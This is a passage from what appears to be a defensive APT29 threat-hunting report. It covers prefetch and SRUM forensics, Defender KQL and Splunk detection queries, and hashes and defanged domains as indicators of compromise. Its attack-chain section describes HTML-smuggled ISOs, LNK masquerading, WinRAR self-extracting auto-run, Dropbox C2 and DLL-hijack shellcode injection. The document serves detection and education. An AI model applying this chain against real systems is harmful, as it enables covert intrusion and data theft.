<tr><td><img src="/assets/img/posts/apt29-hunting/img-203.png" width="380" alt="prefetch"/></td><td><img src="/assets/img/posts/apt29-hunting/img-205.png" width="380" alt="prefetch"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-206.png" width="380" alt="PECmd output"/></td><td><img src="/assets/img/posts/apt29-hunting/img-207.png" width="380" alt="PECmd output"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-208.png" width="380" alt="PECmd output"/></td><td><img src="/assets/img/posts/apt29-hunting/img-209.png" width="380" alt="PECmd output"/></td></tr>
</table>

**Confirmed executions (run counts):**

| Prefetch file | Run count |
|---------------|-----------|
| `4344.EXE-4A79C548.pf` | 3 |
| `ARTIFACT_X64.EXE-A673DF30.pf` | 6 |
| `T1071.001.EXE-0C2CD751.pf` | — |
| `DLLHOST.EXE-504C779A.pf` | 7 |
| `POWERSHELL.EXE-920BBA2A.pf` | 29 |
| `EVIL.EXE-07B0B829.pf` | 6 |
| `WHOAMI.EXE-B8288E39.pf` | 8 |
| `HOSTNAME.EXE-D4E60423.pf` | 1 |

Execution window: **2025-12-02 14:50:08 → 2025-12-06 14:56:15**.

#### SRUM — System Resource Usage Monitor

Tracks application/system resource usage (network, energy, process execution). KAPE drops it at `...\Kape Results\C\Windows\system32\SRU`. Parse with **SrumECmd**:
```text
SrumECmd.exe -f "C:\Users\Subzero\Desktop\SRUDB.dat" --csv C:\Users\Subzero\Desktop\
SrumECmd.exe -d "C:\Users\Subzero\Desktop\SRU"     --csv C:\Users\Subzero\Desktop\
```
Outputs: `ApplicationResourceUsage`, `NetworkConnectivity`, `EnergyUsage`, `NetworkUsage`, `Timeline`.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-210.png" width="380" alt="SRUM"/></td><td><img src="/assets/img/posts/apt29-hunting/img-211.png" width="380" alt="SRUM"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-212.png" width="380" alt="SRUM"/></td><td><img src="/assets/img/posts/apt29-hunting/img-214.png" width="380" alt="SRUM timeline"/></td></tr>
</table>

**App Resource Usage:**

| File | Face Time | Foreground Bytes |
|------|-----------|------------------|
| `T1071.001.exe` | 109,206,880,000 | 2,344,960 |
| `evil.exe` | 36,600,150,000 | 1,638,400 |

**App Timeline Provider** captured: `net1` (user creation), `whoami`, `hostname`, `schtasks.exe`, and PowerShell executions — all tied to SID `S-1-5-21-1064308082-3896131167-3449499780-1001`.

<img src="/assets/img/posts/apt29-hunting/img-213.png" width="400" alt="SRUM timeline"/> <img src="/assets/img/posts/apt29-hunting/img-216.png" width="400" alt="SRUM"/> <img src="/assets/img/posts/apt29-hunting/img-217.png" width="400" alt="SRUM network"/>

**Network Usage (real connections):**

| Process | Bytes Sent | Bytes Received |
|---------|-----------|----------------|
| `t1071.001.exe` | 83,338,496 | 65,592,861 |
| `evil.exe` | 42,709 | 150,474 |
| `invite for attack.hta.exe` | 48,564 | 224,350 |
| `OneDrive.exe` | 28,245 | 201,581 |
| `rundll32.exe` *(unusual volume)* | 194,044 | 44,699 |

Interface: `IF_TYPE_ETHERNET_CSMACD` · Interface LUID: `1689399632855040`.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-218.png" width="380" alt="network usage"/></td><td><img src="/assets/img/posts/apt29-hunting/img-219.png" width="380" alt="network usage"/></td></tr>
</table>

---

## 9 · Attachment-Drop Technique (Full Chain Emulation)

> 📎 Emulation references: [carbonblack/tau-tools Invoke-APT29](https://github.com/carbonblack/tau-tools/blob/master/threat_emulation/Invoke-APT29/apt29.ps1) · [S3N4T0R-0X0/APT29-Adversary-Simulation](https://github.com/S3N4T0R-0X0/APT29-Adversary-Simulation)

This chain mirrors APT29's documented DOCX → HTML-smuggling → ISO/LNK → image-execution → cloud-C2 flow.

| Stage | Technique | Detail |
|-------|-----------|--------|
| **1. DOCX (Initial Access)** | Embedded hyperlink | A malicious DOCX contains a hidden hyperlink that silently downloads an external HTML file. The link does not appear in the document text, evading user suspicion. |
| **2. HTML Smuggling** | Conceal ISO | The HTML file embeds a Base64-encoded ISO (`base64 payload.iso -w 0`). The browser reconstructs and downloads it locally, bypassing network detection. Phishing text + a BMW car image reinforce the lure. |
| **3. ISO + LNK Abuse** | Masquerading | The ISO contains LNK files masquerading as images. When run, they launch a legitimate executable, display a decoy PNG, and load encrypted shellcode into memory (decrypted at runtime). |
| **4. Image-Based Execution** | WinRAR SFX | A crafted PNG (legit BMW visuals) hides a WinRAR self-extracting archive configured to run a command on extraction; the archive icon is swapped for an image icon. A shortcut is packaged with legit images into an ISO via PowerISO. |
| **5. Payload Execution** | Run-after-extract | WinRAR's "Run after extraction" (Advanced SFX) executes the payload automatically when the victim opens the ISO. The victim believes they're viewing BMW images while the payload runs simultaneously. |
| **6. Dropbox C2** | Cloud relay | The Dropbox API is used as the C2 channel, blending traffic into legitimate cloud usage. The access token is AES-ECB encrypted (16/24/32-byte key), Base64-encoded, and embedded in the payload. A Python test payload validated connectivity first. |
| **7. DLL Hijacking + Shellcode Injection** | Stealth exec | A malicious DLL loads instead of a legitimate one (improper search-order handling); shellcode runs from `DllMain`. |
| **8. Final Payload** | C2 + exfil | Establishes outbound comms with the Dropbox API C2 (optionally primary/secondary C2 via Microsoft Graph API) and uploads collected data and command output. |

**DLL-hijacking execution flow:**

```text
DLL Hijacking      → malicious DLL loaded via improper search-order handling
Shellcode Exec     → shellcode stored in the DLL, executed via DllMain
Memory Allocation  → VirtualAlloc allocates executable memory in the target process
Shellcode Inject   → memcpy copies shellcode into allocated memory
Priv Inheritance   → if target runs elevated, injected shellcode inherits privileges
Fault Tolerance    → if the DLL fails to load, log a warning and continue
```

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-220.png" width="400" alt="attachment drop chain"/></td><td><img src="/assets/img/posts/apt29-hunting/img-221.png" width="400" alt="attachment drop chain"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-222.png" width="400" alt="dropbox c2"/></td><td><img src="/assets/img/posts/apt29-hunting/img-223.png" width="400" alt="dll hijack"/></td></tr>
</table>

---

## 10 · Detection Content Appendix

#### 10.1 KQL (Microsoft Defender / Advanced Hunting)

**Suspicious file drops on Desktop**
```kql
DeviceFileEvents
| where FolderPath endswith @"\Desktop"
| where FileName contains "Attack" or FileName contains "Update"
   or FileName endswith ".hta" or FileName endswith ".exe"
```

**LOLBin / mshta spawning PowerShell**
```kql
DeviceProcessEvents
| where InitiatingProcessFileName == "mshta.exe"
| where FileName == "powershell.exe" or FileName == "pwsh.exe"
```

**Encoded PowerShell + network correlation**
```kql
DeviceProcessEvents
| where FileName ==~ "powershell.exe"
| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "-nop", "-noni", "-w hidden")
   or ProcessCommandLine matches "[A-Za-z0-9+/]{20,}={0,2}"
   or ProcessCommandLine contains "FromBase64String"
| join kind=leftouter (
    DeviceNetworkEvents
    | where InitiatingProcessFileName ==~ "powershell.exe"
    | project DeviceId, RemoteIP, RemotePort, InitiatingProcessCommandLine
  ) on DeviceId
| project Timestamp, DeviceName, ProcessCommandLine, RemoteIP, RemotePort
```

**Scheduled-task creation**
```kql
DeviceEvents
| where ActionType in ("ScheduledTaskCreated", "ScheduledTaskUpdated")
| where AdditionalFields contains "powershell.exe"
   or AdditionalFields contains "SystemUpdate"
   or AdditionalFields contains "Update" or AdditionalFields contains "Maintenance"
| project Timestamp, DeviceName, AccountName, AdditionalFields
```

#### 10.2 Splunk (SPL)

```spl
index=windows EventCode=4688
(NewProcessName="powershell.exe" OR Process_Command_Line="powershell*")
| where like(Process_Command_Line,"%EncodedCommand%") OR like(Process_Command_Line,"%IEX%")
| stats count by ComputerName, NewProcessName, Process_Command_Line, ParentProcessName
```
```spl
index=windows (EventCode=4688 OR EventCode=10)
(ProcessName="lsass.exe" OR TargetImage="lsass.exe")
| stats count by ComputerName, ProcessName, SourceImage, TargetImage
```
```spl
index=windows EventCode=4688
| where like(NewProcessName,"%AppData%") OR like(NewProcessName,"%Temp%")
| stats count by NewProcessName, ParentProcessName, ComputerName
```
```spl
index=windows EventCode=4698
| stats count by TaskName, Author, Command, ComputerName
```
```spl
index=windows EventCode=4657
Registry_Path="\Run\" OR Registry_Path="\RunOnce\"
| stats count by Registry_Path, New_Value, ComputerName
```
```spl
index=windows EventCode=4688 ParentProcessName="wmiprvse.exe"
| stats count by ComputerName, NewProcessName, Process_Command_Line
```
```spl
index=windows EventCode=4688 NewProcessName="rundll32.exe"
| where like(Process_Command_Line,"%AppData%") OR like(Process_Command_Line,"%Temp%")
| stats count by ComputerName, Process_Command_Line
```
```spl
index=proxy OR index=network (dest_port=443 OR dest_port=8443)
| stats count by src_ip, dest_ip, dest_domain
| where count < 5
```
```spl
index=windows EventCode=4624 LogonType=3
| stats count by Account_Name, ComputerName, Source_Network_Address
```
```spl
index=windows EventCode=4663
Object_Name="\AppData\" OR Object_Name="\Temp\"
| stats count by Object_Name, ProcessName, ComputerName
```

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-224.png" width="400" alt="SPL queries"/></td><td><img src="/assets/img/posts/apt29-hunting/img-225.png" width="400" alt="SPL queries"/></td></tr>
</table>

#### 10.3 Windows / Sysmon Event Reference

| Source | Event ID | Use |
|--------|----------|-----|
| Security | 4688 | Process creation |
| Security | 4104 | PowerShell script-block logging |
| Security | 4698 | Scheduled task created |
| Security | 4657 | Registry value modified (Run/RunOnce) |
| Security | 4624 (Type 3) | Network logon |
| Security | 4663 | Object access (AppData/Temp) |
| Sysmon | 1 | Process create |
| Sysmon | 3 | Network connection |
| Sysmon | 7 | Image loaded (DLL) |
| Sysmon | 11 | File create |
| Sysmon | 13 | Registry set |

---

## 11 · Indicators of Compromise (IOC) Appendix

#### File Hashes

| File | Hash | Type | Campaign |
|------|------|------|----------|
| `e-yazi.htm` dropped file | `4527057000a4b06f000983b5b61cc85c10f03691fa17d5c51a9fd0b24280662d` | SHA-256 | Türkiye (Mar 2023) |
| `a8jet3l1v.exe` (in `e-yazi.iso`) | `948c62e8d953038b6a0030136cb82f55a8251db2c165ca07c01a7568f4644240` | SHA-256 | Türkiye |
| `e-yazi.html` | `cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a` | SHA-256 | Türkiye |
| `e-yazi.zip` | `0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839` | SHA-256 | Türkiye |
| `Note.pdf` | `46c8289301129c0833529495f4f3748b5adff78e18f1427654cb3b597352873e` | SHA-256 | European diplomatic |
| `note.html` (`..._JC.html`) | `92a5be2893743435b79e94aa64a74233a2240fd790ca948e1cb046da5b4072f1` | SHA-256 | European diplomatic |
| `Wine event.pdf` | `62ce8e1489a8b87539792c07179faf1db1b46caa39b55902a4d82dcec44d72ae` | SHA-256 | Czechia wine (Apr 2023) |
| `bmw.iso` | `e306333093eaf198f4d416d25a40784a` | MD5 | Kyiv BMW (May 2023) |
| `Invintation.zip` | `38719acc6254b7ff70dc8a7723bd8e92` | MD5 | Kyiv charity (May 2023) |
| Charity payload | `1aee5bf23edb7732fd0e6b2c61a959ce` | MD5 | Kyiv charity |
| BURNTBATTER | `5569fb4e9140974a80b4b7587b026913` | MD5 | Kyiv charity |
| DONUT | `595d8ea258ef8d8ec70b0e8a740e903c` | MD5 | Kyiv charity |
| Dropped | `2d794d1544f933aacbd8da2dad78b381` | MD5 | Kyiv charity |
| Dropped | `1c0059d976795ceded7c1dd706e74bd1` | MD5 | Kyiv charity |
| `reception.pdf` | `a8b56b51e085955b5641a9cb74c3b66ee5c37d62703f28b01cfbf7122a7edbfa` | SHA-256 | Split ROOTSAW / ICEBEAT |
| `invitation.svg` | `4875a9c4af3044db281c5dc02e5386c77f331e3b92e5ae79ff9961d8cd1f7c4f` | SHA-256 | Split ROOTSAW (Jun 2023) |
| `covenant.exe` | `287543c235cf68695373d367144c51a0236879e614e8ea4634b82e5336785edc` | SHA-256 | Sample analysis |
| `ds7002.zip` | `3fccf531ff0ae6fedd7c586774b17a2d` | MD5 | DoS phishing (Nov 2018) |
| `ds7002.lnk` | `6ed0020b0851fb71d5b0076f4ee95f3c` | MD5 | DoS phishing |
| `cyzfc.dat` | `16bbc967a8b6a365871a05c74a4f345b` | MD5 | DoS phishing |
| `ds7002.pdf` (decoy) | `313f4808aa2a2073005d219bc68971cd` | MD5 | DoS phishing |

#### Domains / URLs

```text
tinyurl[.]com/mrxcjsbs                         (Türkiye redirect)
www[.]willyminiatures[.]com/e-yazi.htm         (ROOTSAW dropper)
simplesalsamix[.]com/e-yazi.html               (Türkiye 2nd wave)
parquesanrafael[.]cl/note.html | note.php?ua=  (European diplomatic)
sylvio[.]com[.]br/form.php                     (Czechia wine)
gavice[.]ng/event_program.php                  (Kyiv charity payload)
sgrfh[.]org.pk/wp-content/idx.php?n=ks&q=       (ICEBEAT profiling)
jmj[.]com/personal/nauerthn_state_gov/*         (2018 malware hosting)
pandorasong[.]com → 95.216.59[.]92             (2018 C2)
northshorehealthgm[.]org                        (2018 phishing sender)
```

#### Lab / Emulation Artifacts

```text
Victim:   DESKTOP-M8AP5P7\Victim-Machine
SID:      S-1-5-21-1064308082-3896131167-3449499780-1001
Attacker: 192.168.253.148 (Kali)  ·  Victim: 192.168.253.147
Beacons:  4344.exe, evil.exe, t1071.001.exe, onedrive.exe, healthy_stitch.exe, APT29.dll
Task:     SystemUpdate (hourly, SYSTEM)  ·  Script: APT-shtask.ps1
Rogue user: APT29 (added to Remote Desktop Users)
```

---

## 12 · References

1. SVR / Foreign Intelligence Service — <https://en.wikipedia.org/wiki/Foreign_Intelligence_Service_(Russia)>
2. Sekoia glossary (APT29 / Nobelium / Cozy Bear) — <https://www.sekoia.io/en/glossary/apt29-aka-nobelium-cozy-bear/>
3. Vectra AI threat actor profile — <https://www.vectra.ai/modern-attack/threat-actors/apt29>
4. Hedgehog Security — <https://hedgehogsecurity.co.uk/blog/who-is-apt29>
5. Cyble threat actor profile — <https://cyble.com/threat-actor-profiles/apt-29/>
6. Mandiant / Google Cloud — APT29 evolving diplomatic phishing — <https://cloud.google.com/blog/topics/threat-intelligence/apt29-evolving-diplomatic-phishing>
7. Mandiant / Google Cloud — Tracking APT29 phishing campaigns — <https://cloud.google.com/blog/topics/threat-intelligence/tracking-apt29-phishing-campaigns>
8. RNBO — APT29 attacks embassies using CVE-2023-38831 — <https://www.rnbo.gov.ua/files/2023_YEAR/CYBERCENTER/november/APT29%20attacks%20Embassies%20using%20CVE-2023-38831%20-%20report%20en.pdf>
9. Mandiant — "Not So Cozy" 2018 campaign — <https://cloud.google.com/blog/topics/threat-intelligence/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign>
10. Picus Security — APT29 / Cozy Bear evolution — <https://www.picussecurity.com/resource/blog/apt29-cozy-bear-evolution-techniques>
11. Intel471 — Threat Hunting Case Study: Cozy Bear — <https://www.intel471.com/blog/threat-hunting-case-study-cozy-bear>
12. MSSP Lab — APT29 malware analysis — <https://mssplab.github.io/threat-hunting/2023/06/02/malware-analysis-apt29.html>
13. Carbon Black TAU — Invoke-APT29 — <https://github.com/carbonblack/tau-tools/blob/master/threat_emulation/Invoke-APT29/apt29.ps1>
14. S3N4T0R-0X0 — APT29 Adversary Simulation — <https://github.com/S3N4T0R-0X0/APT29-Adversary-Simulation>
15. MITRE ATT&CK — [T1566.001](https://attack.mitre.org/techniques/T1566/001/) · [T1059.001](https://attack.mitre.org/techniques/T1059/001/) · [T1053.005](https://attack.mitre.org/techniques/T1053/005/) · [T1021.001](https://attack.mitre.org/techniques/T1021/001/) · [T1003.001](https://attack.mitre.org/techniques/T1003/001/) · [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

---

<div align="center">

*Report compiled for defensive research and education. All offensive activity was performed in an isolated lab.*

**— End of Report —**

</div>
